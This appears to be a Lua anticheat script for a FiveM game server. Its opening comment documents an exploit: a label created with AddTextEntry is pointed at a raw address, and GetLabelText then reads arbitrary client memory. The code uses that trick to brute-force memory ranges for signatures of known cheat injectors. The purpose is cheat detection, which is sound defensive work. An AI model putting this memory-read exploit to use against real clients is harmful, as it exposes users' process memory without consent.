-- @author: Poisskail for SecurGate anticheat
-- POC : 
--  Used the old source of the GetLabelText and AddTextEntry 
--  AddTextEntry data was saved in memory without filter for character type
--  So if there was no filter, AddTextEntry and adress will be the same as read the string associated to the address+
--Exploit : 
        -- Citizen.InvokeNative(0x32ca01c3, "1337", address)
        -- value = GetLabelText("1337")


local d3d10EndOffset = "145f"
local susanoEndOffset = "8020"
local tzEndOffset1 = "e480"
local hexChars = '0123456789abcdef'
local foundCheat = false
local CheckCount = 0
local nullAddress = 0
local onCheckCheat = false

function readStringMemory(address)
    local value = ""
    xpcall(function()
        Citizen.InvokeNative(0x32ca01c3, "1337", address)
        value = GetLabelText("1337")
    end, function(err)
        
    end)
    return value
end

function bruteForceAddresses(offset, start, endO, start2, whatCheck)
    Citizen.CreateThread(function()
        for i = start, endO do
            if foundCheat then break end
            Wait(10)
            for j = start2, 15 do
                if foundCheat then break end
                Wait(1)
                for k = 0, 15 do
                    if foundCheat then break end
                    for l = 0, 15 do
                        if foundCheat then break end
                        for m = 0, 15 do
                            if foundCheat then break end

                            local hexAddress = offset .. hexChars:sub(i + 1, i + 1) .. hexChars:sub(j + 1, j + 1) .. hexChars:sub(k + 1, k + 1) .. hexChars:sub(l + 1, l + 1) .. hexChars:sub(m + 1, m + 1)

                            if whatCheck == "tz" then 
                                local tzAddress = tonumber(hexAddress .. tzEndOffset1)
                                local tzAddressValue = readStringMemory(tzAddress)
                                if tzAddressValue == "NULL" then
                                    nullAddress = nullAddress + 1
                                end
                            else 
                                local d3d10Address = tonumber(hexAddress .. d3d10EndOffset)
                                local susanoAddress = tonumber(hexAddress .. susanoEndOffset)
                                local d3d10AddressValue = readStringMemory(d3d10Address)
                                local susanoAddressValue = readStringMemory(susanoAddress)

                                if d3d10AddressValue == "Fd3d10.dll" then
                                    print("d3d10.dll Cheat Detected", "This player tried To Inject A Forbidden d3d10.dll.")
                                    foundCheat = true
                                    return true
                                end

                                if susanoAddressValue and string.find(susanoAddressValue, "Online -") then
                                    print("Susano Cheat Detected", "This player tried To Inject Susano.")
                                    foundCheat = true
                                    return true
                                end
                            end
                        end
                    end
                end
            end
        end
        CheckCount = CheckCount + 1

        if (nullAddress > 1750 and nullAddress < 1850 or nullAddress > 600 and nullAddress < 900) and whatCheck == "tz" then 
            print("TZ Project Detected", "This player tried To Inject TZ Project.")
            foundCheat = true
            return true
        end

        if CheckCount == 1 then bruteForceAddresses("0x7ff", 8, 10, 0, "allOther") end
        if CheckCount == 2 then bruteForceAddresses("0x7ff", 13, 15, 0, "allOther") end
        if CheckCount == 3 then onCheckCheat = false return end
    end)
end

local alreadyLaunchTheCheck = false
function startCheckBlud()
    if alreadyLaunchTheCheck then return end
    alreadyLaunchTheCheck = true
    DoScreenFadeOut(500)
    while not IsScreenFadedOut() do Wait(500) DoScreenFadeOut(0) end

    onCheckCheat = true
    Wait(1000)
    FreezeEntityPosition(PlayerPedId(), true)
    bruteForceAddresses("0x7ff", 6, 7, 1, "tz")

    while onCheckCheat do Wait(1000) end 
    DoScreenFadeIn(500)
    FreezeEntityPosition(PlayerPedId(), false)
end
